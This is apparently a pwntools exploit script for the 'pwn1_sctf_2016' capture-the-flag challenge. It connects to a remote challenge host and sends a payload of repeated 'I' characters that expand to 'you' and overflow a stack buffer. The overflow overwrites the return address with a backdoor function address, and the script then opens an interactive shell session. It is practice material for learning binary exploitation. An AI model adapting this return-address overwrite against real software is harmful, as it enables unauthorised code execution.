from pwn import *

# p = process("./pwn1_sctf_2016")
p = remote("node4.buuoj.cn", 26182)

back_door = 0x08048F0D 

# replace "I" with "you" --> overflow
payload = b"I"*21+b"a"+p32(back_door)
p.sendline(payload)

p.interactive()

